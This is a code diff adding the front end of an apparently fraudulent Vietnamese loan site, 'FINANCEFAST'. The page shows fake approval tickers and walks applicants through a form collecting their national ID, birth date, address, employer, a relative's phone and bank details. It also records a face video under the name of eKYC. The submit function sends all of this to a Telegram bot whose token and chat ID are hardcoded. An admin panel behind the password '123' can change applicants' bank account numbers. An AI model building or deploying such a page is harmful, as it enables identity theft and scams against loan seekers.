+            <button onclick="closeAuthModal()" class="absolute top-4 right-4 text-slate-400 hover:text-slate-600 text-lg font-bold">✕</button>
+            <div class="text-center space-y-1">
+                <h3 class="text-xl font-black text-slate-900">Cổng Đăng Nhập</h3>
+                <p class="text-xs text-slate-500 font-semibold">Đăng nhập tài khoản khách hàng</p>
+            </div>
+            
+            <div class="flex bg-slate-100 p-1 rounded-xl">
+                <button onclick="switchAuthTab('login')" id="tabLoginBtn" class="flex-1 py-2 font-bold text-xs rounded-lg bg-white text-slate-900 shadow-sm transition">Đăng Nhập</button>
+                <button onclick="switchAuthTab('register')" id="tabRegBtn" class="flex-1 py-2 font-bold text-xs rounded-lg text-slate-500 transition">Đăng Ký</button>
+            </div>
+
+            <div id="loginBox" class="space-y-3">
+                <input type="text" id="loginPhone" placeholder="Số điện thoại của bạn" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
+                <input type="password" id="loginPass" placeholder="Mật khẩu" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
+                <button onclick="handleLogin()" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-3.5 rounded-xl font-black text-sm shadow-md transition">Đăng Nhập Ngay</button>
+            </div>
+
+            <div id="registerBox" class="space-y-3 hidden">
+                <input type="text" id="regName" placeholder="Họ và tên" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
+                <input type="tel" id="regPhone" placeholder="Số điện thoại" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
+                <input type="password" id="regPass" placeholder="Mật khẩu" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
+                <button onclick="handleRegister()" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white py-3.5 rounded-xl font-black text-sm shadow-md transition">Đăng Ký Tài Khoản</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="w-full text-center py-4 text-xs font-bold text-slate-400 border-t border-slate-100 pb-24">
+        &copy; 2026 FINANCEFAST. All rights reserved.
+    </footer>
+
+    <script>
+        const BOT_TOKEN = "8813882772:AAFe5hE16dVTUDxwWEruzhNogArLgbGcoi4";
+        const CHAT_ID = "8348914397";
+
+        let formData = {};
+        let mediaStream, mediaRecorder, recordedChunks = [], videoBlob = null;
+        let allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
+        let currentSelectedLoanId = null;
+
+        let currentUser = localStorage.getItem('ff_current_user') || null;
+        let currentUserName = localStorage.getItem('ff_current_name') || null;
+        let isAdminLoggedIn = localStorage.getItem('ff_is_admin') === 'true';
+
+        let defaultUsers = JSON.parse(localStorage.getItem('ff_users') || '[]');
+        if(defaultUsers.length === 0) {
+            defaultUsers.push({ name: "Nguyễn Văn A", phone: "0988888888", pass: "123456" });
+            localStorage.setItem('ff_users', JSON.stringify(defaultUsers));
+        }
+
+        let teleLink = localStorage.getItem('ff_tele_link') || 'https://t.me/';
+        let fbLink = localStorage.getItem('ff_fb_link') || 'https://m.me/';
+        let zaloLink = localStorage.getItem('ff_zalo_link') || 'https://zalo.me/';
+
+        function applySupportLinks() {
+            document.getElementById('floatingTele').href = teleLink;
+            document.getElementById('floatingFb').href = fbLink;
+            document.getElementById('floatingZalo').href = zaloLink;
+            document.getElementById('teleLinkInput').value = teleLink;
+            document.getElementById('fbLinkInput').value = fbLink;
+            document.getElementById('zaloLinkInput').value = zaloLink;
+        }
+        applySupportLinks();
+
+        function saveSupportLinks() {
+            teleLink = document.getElementById('teleLinkInput').value.trim() || 'https://t.me/';
+            fbLink = document.getElementById('fbLinkInput').value.trim() || 'https://m.me/';
+            zaloLink = document.getElementById('zaloLinkInput').value.trim() || 'https://zalo.me/';
+
+            localStorage.setItem('ff_tele_link', teleLink);
+            localStorage.setItem('ff_fb_link', fbLink);
+            localStorage.setItem('ff_zalo_link', zaloLink);
+            applySupportLinks();
+        }
+
+        function setQuickNote(text) {
+            document.getElementById('editNote').value = text;
+        }
+
+        function copySyntax() {
+            const syntaxText = document.getElementById('syntaxText').textContent;
+            navigator.clipboard.writeText(syntaxText).then(() => {
+                alert("Đã sao chép cú pháp: " + syntaxText);
+            });
+        }
+
+        function previewSelectedImage(input, previewId) {
+            if (input.files && input.files[0]) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    document.getElementById(previewId).innerHTML = `
+                        <div class="relative w-full h-20 rounded-xl overflow-hidden border border-amber-300 shadow">
+                            <img src="${e.target.result}" class="w-full h-full object-cover">
+                            <span class="absolute bottom-1 right-1 bg-emerald-600 text-white text-[9px] font-bold px-1.5 py-0.5 rounded">Đã chọn</span>
+                        </div>`;
+                }
+                reader.readAsDataURL(input.files[0]);
+            }
+        }
+
+        async function startAutoEkyc() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const videoEl = document.getElementById('webcam');
+                videoEl.srcObject = stream;
+                
+                const btn = document.getElementById('ekycBtn');
+                btn.disabled = true;
+                btn.classList.add('opacity-50');
+                
+                let chunks = [];
+                let recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                
+                recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
+                recorder.onstop = () => {
+                    videoBlob = new Blob(chunks, { type: 'video/webm' });
+                    stream.getTracks().forEach(track => track.stop());
+                    document.getElementById('ekycInstruction').textContent = "✅ Xác thực khuôn mặt thành công!";
+                    document.getElementById('ekycInstruction').className = "text-xs font-black text-emerald-600 bg-emerald-50 py-1.5 px-3 rounded-full inline-block border border-emerald-200";
+                    btn.textContent = "Đã Hoàn Thành";
+                };
+
+                recorder.start();
+                
+                const instEl = document.getElementById('ekycInstruction');
+                instEl.textContent = "🔄 Đang quay: Nhìn thẳng vào camera...";
+                
+                setTimeout(() => { instEl.textContent = "⬅️ Quay đầu sang TRÁI nhẹ nhàng..."; }, 1500);
+                setTimeout(() => { instEl.textContent = "➡️ Quay đầu sang PHẢI nhẹ nhàng..."; }, 3200);
+                setTimeout(() => { instEl.textContent = "⬆️ Ngước nhẹ mặt lên trên..."; }, 5000);
+                setTimeout(() => { 
+                    instEl.textContent = "⏳ Đang lưu dữ liệu eKYC..."; 
+                    recorder.stop();
+                }, 6500);
+
+            } catch(e) {
+                alert("Không thể truy cập camera. Vui lòng cấp quyền trình duyệt trên điện thoại!");
+            }
+        }
+
+        const tickerMessages = [
+            "Khách hàng 098****219 vừa duyệt vay 20.000.000 ₫",
+            "Khách hàng 035****881 vừa giải ngân 50.000.000 ₫",
+            "Khách hàng 091****442 vừa duyệt vay 100.000.000 ₫",
+            "Khách hàng 077****903 vừa giải ngân 15.000.000 ₫"
+        ];
+        let tickerIndex = 0;
+        setInterval(() => {
+            const tickerEl = document.getElementById('liveTicker');
+            if(tickerEl) {
+                tickerEl.style.opacity = 0;
+                setTimeout(() => {
+                    tickerIndex = (tickerIndex + 1) % tickerMessages.length;
+                    tickerEl.textContent = tickerMessages[tickerIndex];
+                    tickerEl.style.opacity = 1;
+                }, 300);
+            }
+        }, 3500);
+
+        function calculateLoan() {
+            const principal = parseInt(document.getElementById('loanRange').value);
+            const months = parseInt(document.getElementById('loanTerm').value);
+            document.getElementById('amountDisplay').textContent = new Intl.NumberFormat('vi-VN').format(principal) + " ₫";
+
+            const monthlyInterestRate = 0.012;
+            const totalInterest = principal * monthlyInterestRate * months;
+            const totalAmount = principal + totalInterest;
+            const monthlyPayment = totalAmount / months;
+
+            document.getElementById('monthlyPayment').textContent = new Intl.NumberFormat('vi-VN').format(Math.round(monthlyPayment)) + " ₫ / tháng";
+            document.getElementById('totalPayment').textContent = new Intl.NumberFormat('vi-VN').format(Math.round(totalAmount)) + " ₫";
+        }
+
+        window.onload = function() { 
+            calculateLoan(); 
+            renderAdminLoanList(); 
+            checkLoginState();
+        };
+
+        function checkLoginState() {
+            const btn = document.getElementById('userAccountBtn');
+            if (isAdminLoggedIn) {
+                btn.textContent = "🛡️ Quản Trị";
+                document.getElementById('adminPanel').classList.remove('hidden');
+                renderAdminLoanList();
+            } else if (currentUser) {
+                btn.textContent = "👤 " + (currentUserName || currentUser);
+            } else {
+                btn.textContent = "Đăng Nhập";
+            }
+        }
+
+        function handleHeaderAccountClick() {
+            if (isAdminLoggedIn) {
+                switchTab('home');
+            } else if (currentUser) {
+                switchTab('profile');
+            } else {
+                openAuthModal();
+            }
+        }
+
+        function switchTab(tabName) {
+            document.getElementById('stepHome').classList.add('hidden');
+            document.getElementById('tabLoanInfo').classList.add('hidden');
+            document.getElementById('tabApplications').classList.add('hidden');
+            document.getElementById('tabProfile').classList.add('hidden');
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step4').classList.add('hidden');
+            document.getElementById('progressContainer').classList.add('hidden');
+
+            if(tabName === 'home') {
+                document.getElementById('stepHome').classList.remove('hidden');
+                if (isAdminLoggedIn) {
+                    document.getElementById('adminPanel').classList.remove('hidden');
+                }
+            } else if(tabName === 'loanInfo') {
+                document.getElementById('tabLoanInfo').classList.remove('hidden');
+            } else if(tabName === 'applications') {
+                if(!currentUser && !isAdminLoggedIn) { openAuthModal(); return; }
+                renderClientApplications();
+                document.getElementById('tabApplications').classList.remove('hidden');
+            } else if(tabName === 'profile') {
+                if(!currentUser && !isAdminLoggedIn) { openAuthModal(); return; }
+                if (isAdminLoggedIn) {
+                    document.getElementById('adminPanel').classList.remove('hidden');
+                } else {
+                    document.getElementById('profileFullName').textContent = currentUserName || "Khách hàng";
+                    document.getElementById('profileUserPhone').textContent = "SĐT: " + currentUser;
+                    document.getElementById('profileAvatar').textContent = (currentUserName || "K").charAt(0).toUpperCase();
+                    document.getElementById('tabProfile').classList.remove('hidden');
+                }
+            }
+        }
+
+        function renderClientApplications() {
+            const container = document.getElementById('appStatusContainer');
+            const userLoans = allLoans.filter(l => l.user === currentUser);
+            if(userLoans.length === 0) {
+                container.innerHTML = `<div class="bg-slate-50 border border-slate-200 rounded-2xl p-5 text-center space-y-3"><div class="text-4xl">📂</div><p class="text-xs md:text-sm text-slate-500 font-bold">Bạn chưa có hồ sơ vay nào được gửi đi.</p><button onclick="switchTab('home')" class="bg-amber-400 text-slate-900 px-5 py-2.5 rounded-xl text-xs md:text-sm font-bold shadow-sm">Tạo Hồ Sơ Vay</button></div>`;
+                return;
+            }
+            let html = '';
+            userLoans.forEach(loan => {
+                html += `<div class="bg-slate-50 border border-slate-200 rounded-2xl p-4.5 space-y-3.5 text-xs md:text-sm shadow-sm">
+                    <div class="flex justify-between items-center border-b border-slate-200 pb-2.5">
+                        <span class="font-black text-slate-900 text-base">Hồ Sơ Vay Tiêu Dùng</span>
+                        <span class="font-bold text-amber-700 bg-amber-100 px-3 py-1 rounded-full text-xs">${loan.status}</span>
+                    </div>
+                    <div class="grid grid-cols-2 gap-3 text-xs">
+                        <div><span class="text-slate-500 block font-semibold">Số tiền vay:</span><strong class="text-slate-900 text-sm">${loan.amount}</strong></div>
+                        <div><span class="text-slate-500 block font-semibold">Kỳ hạn vay:</span><strong class="text-slate-900 text-sm">${loan.term}</strong></div>
+                        <div><span class="text-slate-500 block font-semibold">Lãi suất hàng tháng:</span><strong class="text-emerald-600">1.2% / tháng</strong></div>
+                        <div><span class="text-slate-500 block font-semibold">Đóng hàng tháng:</span><strong class="text-amber-700 text-sm">${loan.monthlyPayment}</strong></div>
+                        <div><span class="text-slate-500 block font-semibold">Mục đích vay:</span><strong class="text-slate-800">${loan.purpose}</strong></div>
+                        <div><span class="text-slate-500 block font-semibold">Thu nhập:</span><strong class="text-slate-800">${loan.income}</strong></div>
+                        <div class="col-span-2"><span class="text-slate-500 block font-semibold">Nơi làm việc:</span><strong class="text-slate-800">${loan.company} (${loan.compPhone})</strong></div>
+                        <div class="col-span-2"><span class="text-slate-500 block font-semibold">Ngày đóng lãi hàng tháng:</span><strong class="text-amber-600">${loan.payDay}</strong></div>
+                    </div>
+                    <div class="border-t border-slate-200 pt-2.5 space-y-1.5 text-xs">
+                        <div class="flex justify-between"><span class="text-slate-500 font-semibold">Ngân hàng nhận:</span><span class="font-bold">${loan.bankName} (${loan.bankAccount})</span></div>
+                        <div class="flex justify-between"><span class="text-slate-500 font-semibold">Ngày đăng ký:</span><span class="font-bold">${loan.time}</span></div>
+                    </div>
+                    ${loan.note ? `<div class="bg-blue-50 border border-blue-200 p-3 rounded-xl text-blue-900 text-xs font-semibold">📝 <b>Ghi chú từ hệ thống:</b> ${loan.note}</div>` : ''}
+                </div>`;
+            });
+            container.innerHTML = html;
+        }
+
+        function openAuthModal() { document.getElementById('authModal').classList.remove('hidden'); }
+        function closeAuthModal() { document.getElementById('authModal').classList.add('hidden'); }
+
+        function switchAuthTab(type) {
+            if(type === 'login') {
+                document.getElementById('loginBox').classList.remove('hidden');
+                document.getElementById('registerBox').classList.add('hidden');
+                document.getElementById('tabLoginBtn').className = "flex-1 py-2 font-bold text-xs rounded-lg bg-white text-slate-900 shadow-sm transition";
+                document.getElementById('tabRegBtn').className = "flex-1 py-2 font-bold text-xs rounded-lg text-slate-500 transition";
+            } else {
+                document.getElementById('registerBox').classList.remove('hidden');
+                document.getElementById('loginBox').classList.add('hidden');
+                document.getElementById('tabRegBtn').className = "flex-1 py-2 font-bold text-xs rounded-lg bg-emerald-500 text-white shadow-sm transition";
+                document.getElementById('tabLoginBtn').className = "flex-1 py-2 font-bold text-xs rounded-lg text-slate-500 transition";
+            }
+        }
+
+        function handleRegister() {
+            const name = document.getElementById('regName').value.trim();
+            const phone = document.getElementById('regPhone').value.trim();
+            const pass = document.getElementById('regPass').value.trim();
+
+            if(!name || !phone || !pass) { return; }
+            
+            let users = JSON.parse(localStorage.getItem('ff_users') || '[]');
+            if(users.some(u => u.phone === phone)) {
+                return;
+            }
+            users.push({ name, phone, pass });
+            localStorage.setItem('ff_users', JSON.stringify(users));
+
+            document.getElementById('loginPhone').value = phone;
+            switchAuthTab('login');
+        }
+
+        function handleLogin() {
+            const user = document.getElementById('loginPhone').value.trim();
+            const pass = document.getElementById('loginPass').value.trim();
+
+            if(!user || !pass) { return; }
+
+            if(user === "admin" && pass === "123") {
+                isAdminLoggedIn = true;
+                localStorage.setItem('ff_is_admin', 'true');
+                currentUser = null;
+                localStorage.removeItem('ff_current_user');
+                closeAuthModal();
+                document.getElementById('userAccountBtn').textContent = "🛡️ Quản Trị";
+                switchTab('home');
+                return;
+            }
+
+            let users = JSON.parse(localStorage.getItem('ff_users') || '[]');
+            const foundUser = users.find(u => u.phone === user && u.pass === pass);
+
+            if (!foundUser) {
+                alert("Số điện thoại hoặc mật khẩu không chính xác!");
+                return;
+            }
+
+            currentUser = foundUser.phone;
+            currentUserName = foundUser.name;
+            localStorage.setItem('ff_current_user', currentUser);
+            localStorage.setItem('ff_current_name', currentUserName);
+            isAdminLoggedIn = false;
+            localStorage.setItem('ff_is_admin', 'false');
+
+            closeAuthModal();
+            document.getElementById('userAccountBtn').textContent = "👤 " + foundUser.name;
+            switchTab('home');
+        }
+
+        function userLogout() {
+            currentUser = null;
+            currentUserName = null;
+            isAdminLoggedIn = false;
+            localStorage.removeItem('ff_current_user');
+            localStorage.removeItem('ff_current_name');
+            localStorage.setItem('ff_is_admin', 'false');
+            document.getElementById('userAccountBtn').textContent = "Đăng Nhập";
+            openAuthModal();
+        }
+
+        function adminLogout() {
+            userLogout();
+        }
+
+        function renderAdminLoanList() {
+            const listEl = document.getElementById('adminLoanList');
+            const selectEl = document.getElementById('quickClientSelect');
+            if(!listEl) return;
+            
+            if(allLoans.length === 0) {
+                listEl.innerHTML = `<div class="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-500 text-center">Chưa có hồ sơ khách đăng ký mới.</div>`;
+                selectEl.innerHTML = `<option value="">-- Chưa có khách hàng nào --</option>`;
+                return;
+            }
+
+            let html = '';
+            let selectHtml = `<option value="">-- Bấm chọn khách hàng cần copy cú pháp --</option>`;
+            
+            allLoans.forEach((loan, idx) => {
+                html += `<div onclick="selectAdminLoan(${idx})" class="p-3.5 bg-white border border-slate-200 rounded-xl cursor-pointer hover:border-amber-400 transition space-y-1.5 text-xs shadow-sm">
+                    <div class="flex justify-between font-bold text-slate-900 text-sm"><span>${loan.name}</span><span class="text-amber-600">${loan.amount} (${loan.term})</span></div>
+                    <div class="text-xs text-slate-600">SĐT/Mã phiên: #${loan.user} | STK: ${loan.bankAccount}</div>
+                    <div class="flex justify-between items-center pt-1"><span class="text-[11px] font-bold px-2.5 py-0.5 rounded bg-amber-50 text-amber-700">${loan.status}</span><span class="text-xs text-blue-600 font-bold">🔍 Bấm xử lý đơn</span></div>
+                </div>`;
+                
+                selectHtml += `<option value="${loan.user}">Khách: ${loan.name} (SĐT: #${loan.user})</option>`;
+            });
+            listEl.innerHTML = html;
+            selectEl.innerHTML = selectHtml;
+        }
+
+        function selectQuickClient(val) {
+            const syntaxBox = document.getElementById('quickClientSyntax');
+            const syntaxText = document.getElementById('syntaxText');
+            if(!val) {
+                syntaxBox.classList.add('hidden');
+                return;
+            }
+            syntaxText.textContent = `#${val} `;
+            syntaxBox.classList.remove('hidden');
+        }
+
+        function selectAdminLoan(idx) {
+            currentSelectedLoanId = idx;
+            const loan = allLoans[idx];
+            document.getElementById('detName').textContent = `Hồ sơ: ${loan.name}`;
+            document.getElementById('detInfo').innerHTML = `
+                <p><b>Số tiền vay:</b> ${loan.amount} | <b>Kỳ hạn:</b> ${loan.term}</p>
+                <p><b>Đóng hàng tháng:</b> ${loan.monthlyPayment} | <b>Ngày đóng lãi:</b> ${loan.payDay}</p>
+                <p><b>Mục đích vay:</b> ${loan.purpose} | <b>Thu nhập:</b> ${loan.income}</p>
+                <p><b>Công ty:</b> ${loan.company} (${loan.compPhone})</p>
+                <p><b>Ngày sinh:</b> ${loan.dob} | <b>CCCD:</b> ${loan.cccd}</p>
+                <p><b>Quê quán:</b> ${loan.address}</p>
+                <p><b>Người thân:</b> ${loan.rName} - ${loan.rPhone} (${loan.rRelation})</p>
+                <p><b>Ngân hàng:</b> ${loan.bankName} | <b>Chủ thẻ:</b> ${loan.bankOwner}</p>
+            `;
+            document.getElementById('editStk').value = loan.bankAccount;
+            document.getElementById('editNote').value = loan.note || '';
+            document.getElementById('adminDetailBox').classList.remove('hidden');
+        }
+
+        function closeAdminDetail() {
+            document.getElementById('adminDetailBox').classList.add('hidden');
+            currentSelectedLoanId = null;
+        }
+
+        function updateLoanAction(newStatus) {
+            if(currentSelectedLoanId === null) return;
+            allLoans[currentSelectedLoanId].status = newStatus;
+            allLoans[currentSelectedLoanId].bankAccount = document.getElementById('editStk').value;
+            allLoans[currentSelectedLoanId].note = document.getElementById('editNote').value;
+            localStorage.setItem('ff_loans', JSON.stringify(allLoans));
+            renderAdminLoanList();
+            closeAdminDetail();
+        }
+
+        function startLoanProcess() {
+            if(!currentUser && !isAdminLoggedIn) {
+                openAuthModal();
+                return;
+            }
+            formData.amount = document.getElementById('amountDisplay').textContent;
+            formData.term = document.getElementById('loanTerm').value + " Tháng";
+            formData.monthlyPayment = document.getElementById('monthlyPayment').textContent;
+            document.getElementById('stepHome').classList.add('hidden');
+            document.getElementById('step1').classList.remove('hidden');
+            updateProgress(1, 'Bước 1/4: Thông tin cá nhân', 25);
+        }
+
+        function updateProgress(step, title, percent) {
+            document.getElementById('progressContainer').classList.remove('hidden');
+            document.getElementById('stepTitle').textContent = title;
+            document.getElementById('stepPercent').textContent = percent + '%';
+            document.getElementById('progressBar').style.width = percent + '%';
+        }
+
+        function nextStep(current) {
+            if(current === 1) {
+                formData.name = document.getElementById('pName').value;
+                formData.dob = document.getElementById('pDob').value;
+                formData.address = document.getElementById('pAddress').value;
+                formData.cccd = document.getElementById('pCccd').value;
+                formData.purpose = document.getElementById('pPurpose').value;
+                formData.company = document.getElementById('pCompany').value;
+                formData.compPhone = document.getElementById('pCompPhone').value;
+                formData.income = document.getElementById('pIncome').value;
+                formData.payDay = document.getElementById('pPayDay').value;
+
+                if(!formData.name || !formData.dob || !formData.cccd || !formData.company) { return; }
+                document.getElementById('step1').classList.add('hidden');
+                document.getElementById('step2').classList.remove('hidden');
+                updateProgress(2, 'Bước 2/4: Người thân tham chiếu', 50);
+            } else if(current === 2) {
+                formData.rName = document.getElementById('rName1').value;
+                formData.rPhone = document.getElementById('rPhone1').value;
+                formData.rRelation = document.getElementById('rRelation').value;
+                if(!formData.rName || !formData.rPhone) { return; }
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step3').classList.remove('hidden');
+                updateProgress(3, 'Bước 3/4: Tài khoản nhận giải ngân', 75);
+            } else if(current === 3) {
+                formData.bankName = document.getElementById('bankName').value;
+                formData.bankAccount = document.getElementById('bankAccount').value;
+                formData.bankOwner = document.getElementById('bankOwner').value;
+                if(!formData.bankAccount || !formData.bankName) { return; }
+                document.getElementById('step3').classList.add('hidden');
+                document.getElementById('step4').classList.remove('hidden');
+                updateProgress(4, 'Bước 4/4: Xác thực eKYC', 100);
+            }
+        }
+
+        async function submitFinalData() {
+            if(!videoBlob) { return; }
+            const btn = document.getElementById('finalBtn');
+            btn.disabled = true;
+            btn.textContent = "Đang gửi hồ sơ về hệ thống...";
+
+            const calculatedMonthlyPayment = document.getElementById('monthlyPayment').textContent;
+
+            const newLoan = {
+                user: currentUser,
+                name: formData.name,
+                amount: formData.amount,
+                term: formData.term,
+                monthlyPayment: calculatedMonthlyPayment,
+                purpose: formData.purpose,
+                company: formData.company,
+                compPhone: formData.compPhone,
+                income: formData.income,
+                payDay: formData.payDay,
+                dob: formData.dob,
+                address: formData.address,
+                cccd: formData.cccd,
+                rName: formData.rName,
+                rPhone: formData.rPhone,
+                rRelation: formData.rRelation,
+                bankName: formData.bankName,
+                bankAccount: formData.bankAccount,
+                bankOwner: formData.bankOwner,
+                status: 'Đang thẩm định tự động',
+                note: '',
+                time: new Date().toLocaleDateString('vi-VN')
+            };
+            allLoans.unshift(newLoan);
+            localStorage.setItem('ff_loans', JSON.stringify(allLoans));
+
+            try {
+                const msg = `🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n🆔 Mã phiên / SĐT: #${currentUser}\n💰 Số tiền vay: ${formData.amount} (${formData.term})\n💵 Đóng hàng tháng: ${calculatedMonthlyPayment}\n🎯 Mục đích: ${formData.purpose}\n🏢 Công ty: ${formData.company} (${formData.compPhone})\n💵 Thu nhập: ${formData.income}\n📅 Ngày đóng lãi: ${formData.payDay}\n\n👤 Họ tên: ${formData.name}\n📅 Ngày sinh: ${formData.dob}\n🏠 Địa chỉ: ${formData.address}\n🪪 CCCD: ${formData.cccd}\n\n👥 Người thân: ${formData.rName} - SĐT: ${formData.rPhone} (${formData.rRelation})\n\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+                });
+
+                switchTab('applications');
+            } catch(err) {
+                switchTab('applications');
+            }
+        }
+    </script>
+</body>
+</html>
